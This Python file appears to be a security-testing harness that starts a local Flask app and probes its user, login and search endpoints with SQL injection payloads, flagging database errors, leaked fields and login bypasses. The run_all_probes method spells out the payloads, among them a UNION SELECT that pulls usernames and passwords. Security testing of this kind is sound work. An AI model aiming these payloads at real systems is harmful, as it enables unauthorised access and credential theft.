import os
import re
import sys
import time
import signal
import sqlite3
import requests
import subprocess
import threading
from dataclasses import dataclass
from typing import Optional, List


                                                                                
                
                                                                                

@dataclass
class DASTEvidence:
    endpoint: str
    payload: str
    confirmed_taint: bool                                                               
    http_status: int
    response_body: str
    taint_indicators: List[str]                                            
    exploit_succeeded: bool                                                  


                                                                                
             
                                                                                

class DASTRunner:

    def __init__(self, app_dir: str, base_url: str = "http://127.0.0.1:5002"):
        self.app_dir = app_dir
        self.base_url = base_url.rstrip("/")
        self.port = int(base_url.rsplit(":", 1)[-1])
        self._proc: Optional[subprocess.Popen] = None
        self._log_lines: List[str] = []

                                                                                

    def _reader(self, stream):
        for line in iter(stream.readline, b""):
            self._log_lines.append(line.decode("utf-8", errors="replace"))

    def start(self):

        env = os.environ.copy()
        env["FLASK_ENV"] = "development"
        self._proc = subprocess.Popen(
            [sys.executable, "app.py"],
            cwd=self.app_dir,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            env=env,
        )
                               
        t = threading.Thread(target=self._reader, args=(self._proc.stdout,), daemon=True)
        t.start()
                                      
        self._wait_ready()

    def _wait_ready(self, retries: int = 20, delay: float = 0.5):
                                                                                
                                                                              
        for _ in range(retries):
            try:
                r = requests.get(f"{self.base_url}/health", timeout=2)
                if r.status_code == 200:
                    return
            except Exception:
                pass
            time.sleep(delay)
        raise RuntimeError(f"DAST target never became ready at {self.base_url}")

    def stop(self):
        if self._proc and self._proc.poll() is None:
            self._proc.send_signal(signal.SIGTERM)
            try:
                self._proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self._proc.kill()

                                                                                

    def _get(self, path: str, params: dict) -> requests.Response:
        return requests.get(self.base_url + path, params=params, timeout=5)

    def _post(self, path: str, json_body: dict) -> requests.Response:
        return requests.post(self.base_url + path, json=json_body, timeout=5)

                                                                                

    @staticmethod
    def _analyze_response(resp: requests.Response, payload: str) -> tuple:


        body = resp.text
        body_lower = body.lower()
        indicators = []
        exploit = False

                                                                      
        error_sigs = [
            "operationalerror", "sqlite", "syntax error",
            "unrecognized token", "no such column", "near \"",
        ]
        for sig in error_sigs:
            if sig in body_lower:
                indicators.append(f"DB_ERROR_STRING: '{sig}' found in response")

                                                                 
        if resp.status_code == 200 and len(body) > 50:
            leak_sigs = ["password", "secret", "alice", "bob", "charlie", "dave", "admin"]
            for sig in leak_sigs:
                if sig in body_lower:
                    indicators.append(f"DATA_LEAK: sensitive field '{sig}' exposed")
                    exploit = True

                                                            
        if "login" in resp.url and resp.status_code == 200 and "authenticated" in body_lower:
            indicators.append("AUTH_BYPASS: login succeeded with injected credentials")
            exploit = True

        confirmed = len(indicators) > 0
        return confirmed, indicators, exploit

                                                                                

    def probe_get_user(self, payload: str) -> DASTEvidence:
        resp = self._get("/api/user", {"id": payload})
        confirmed, indicators, exploit = self._analyze_response(resp, payload)
        return DASTEvidence(
            endpoint="GET /api/user?id=",
            payload=payload,
            confirmed_taint=confirmed,
            http_status=resp.status_code,
            response_body=resp.text[:500],
            taint_indicators=indicators,
            exploit_succeeded=exploit,
        )

    def probe_login(self, username_payload: str) -> DASTEvidence:
        resp = self._post("/api/login", {
            "username": username_payload,
            "password": "irrelevant",
        })
        confirmed, indicators, exploit = self._analyze_response(resp, username_payload)
        return DASTEvidence(
            endpoint="POST /api/login [username]",
            payload=username_payload,
            confirmed_taint=confirmed,
            http_status=resp.status_code,
            response_body=resp.text[:500],
            taint_indicators=indicators,
            exploit_succeeded=exploit,
        )

    def probe_search(self, payload: str) -> DASTEvidence:
        resp = self._get("/api/search", {"q": payload})
        confirmed, indicators, exploit = self._analyze_response(resp, payload)
        return DASTEvidence(
            endpoint="GET /api/search?q=",
            payload=payload,
            confirmed_taint=confirmed,
            http_status=resp.status_code,
            response_body=resp.text[:500],
            taint_indicators=indicators,
            exploit_succeeded=exploit,
        )

    def run_all_probes(self) -> List[DASTEvidence]:

        probes = [
            self.probe_get_user("1 OR 1=1--"),
            self.probe_get_user("' UNION SELECT 1,username,password FROM users--"),
            self.probe_login("admin'--"),
            self.probe_login("' OR '1'='1"),
            self.probe_search("' OR '1'='1"),
        ]
        return probes


                                                                                
def format_evidence(evidences: List[DASTEvidence]) -> str:
    lines = []
    for e in evidences:
        status = "🔴 CONFIRMED" if e.exploit_succeeded else ("⚠️  TAINTED" if e.confirmed_taint else "🟢 clean")
        lines.append(f"  {status}  {e.endpoint}  (HTTP {e.http_status})")
        lines.append(f"    payload  : {e.payload!r}")
        for ind in e.taint_indicators:
            lines.append(f"    evidence : {ind}")
        if not e.taint_indicators:
            lines.append("    evidence : none")
    return "\n".join(lines)


                                                                                
if __name__ == "__main__":
    import sys
    app_dir = sys.argv[1] if len(sys.argv) > 1 else "target_app"
    runner = DASTRunner(app_dir)
    print(f"Starting DAST target at {runner.base_url} …")
    runner.start()
    try:
        results = runner.run_all_probes()
        confirmed = sum(1 for e in results if e.exploit_succeeded)
        print(f"\nDASTcomplete — {confirmed}/{len(results)} exploits confirmed\n")
        print(format_evidence(results))
    finally:
        runner.stop()
